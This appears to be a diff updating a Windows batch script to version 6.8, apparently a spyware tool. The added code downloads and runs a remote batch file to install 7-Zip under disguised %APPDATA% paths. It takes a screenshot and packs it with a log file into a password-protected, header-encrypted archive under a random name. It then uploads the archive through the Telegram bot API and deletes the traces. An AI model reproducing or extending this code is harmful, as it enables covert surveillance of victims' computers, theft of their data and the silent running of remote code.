@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=6.7"
+set "BATCHVERSION=6.8"
 
 
 
@@ -784,8 +784,8 @@ echo.
 
 :: Check CoreWorkerProcess.exe; if found, skip to CheckComSurrogate
 if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
-    echo %ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe found. Going to CheckNIRCMD
-    goto CheckNIRCMD
+    echo %ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe found. Going to Check7ZIP
+    goto Check7ZIP
 )
 
 
@@ -833,6 +833,53 @@ echo.
 
 
 
+
+
+
+
+
+
+:Check7ZIP
+echo :Check7ZIP
+echo.
+
+:: Check 7z.exe; if found, skip to next section
+if exist "%APPDATA%\Microsoft\7z.exe" (
+    echo %APPDATA%\Microsoft\7z.exe found. Going to CheckNIRCMD
+    goto CheckNIRCMD
+)
+
+:: Run commands if Nircmd.exe is not found
+echo Checking for 7z...
+set "embeddedScript=temp_script_7z.bat"
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/7zip"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Filed to get content from NIRCMD Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto Check7ZIP
+)
+
+set "MESSAGE=%MESSAGE%7ZIP^|"
+set "CheckSend=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
 
 
 
@@ -1315,8 +1362,6 @@ echo.
 
 
 
-
-
 set "LAST_MIN_SENT_FILE=%temp%\Vb5wECTM7Svr"
 
 
@@ -1553,10 +1598,43 @@ echo.
 
 
 
-
-
-
 "%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
+
+
+
+
+
+
+
+
+:COMPRESSFILES
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename7=!filename!"
+set "filename="
+set "ZIP_FILE=%temp%\!filename7!.7z"
+
+
+
+
+set "7zip_PATH=%APPDATA%\microsoft\7z.exe"
+set "Password=VProv7"
+set "File1=%USERPROFILE%\Downloads\screenshot.png"
+set "File2=%LOGFILE1%"
+
+
+echo Compressing Files
+"%7zip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILE%" "%File1%" "%File2%"
+
+
+
+
+
+
 
 
 
@@ -1578,18 +1656,10 @@ set "ENCODED_CAPTION=%CAPTION: =%%2%"
 :: Send the file (as a document)
 curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
      -F "chat_id=%CHAT_ID%" ^
-     -F "caption=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)" ^
-     -F "document=@%LOGFILE1%"
-
-
-
-
-
-:: Send the photo with caption using curl
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
-     -F "chat_id=%CHAT_ID%" ^
      -F "caption=%ENCODED_CAPTION%" ^
-     -F "photo=@%PHOTO_PATH%"
+     -F "document=@%ZIP_FILE%"
+
+
 
 
 
@@ -1616,6 +1686,8 @@ del /f /q "%LOGFILE1%"
 del /f /q "%TASKS_DATA%"
 del /f /q "%ProcessTXTFILE%"
 del /f /q "%InstalledQWB%"
+del /f /q "%ZIP_FILE%"
+
 
 
 
